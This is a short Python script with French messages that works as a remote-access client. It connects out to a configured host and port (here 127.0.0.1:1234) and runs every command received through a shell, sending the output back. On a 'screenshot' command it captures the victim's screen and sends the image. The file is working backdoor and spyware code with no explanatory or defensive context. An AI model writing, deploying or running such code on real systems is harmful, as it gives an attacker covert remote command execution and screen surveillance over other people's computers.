import socket
import subprocess
import pyautogui
import io

ip_address = '127.0.0.1'
port_number = 1234

def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))
    print("Connecté au serveur :)")

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break
            elif command.lower() == 'screenshot':
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                buffer.seek(0)

                cs.send(str(len(buffer.getvalue())).encode())
                cs.recv(1024)

                cs.sendall(buffer.getvalue())
                continue
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            output = result.stdout + result.stderr
            if not output:
                output = "Commande executée, pas de sortie !."
            cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            break

    cs.close()

if __name__ == "__main__":
    connect_to_server()
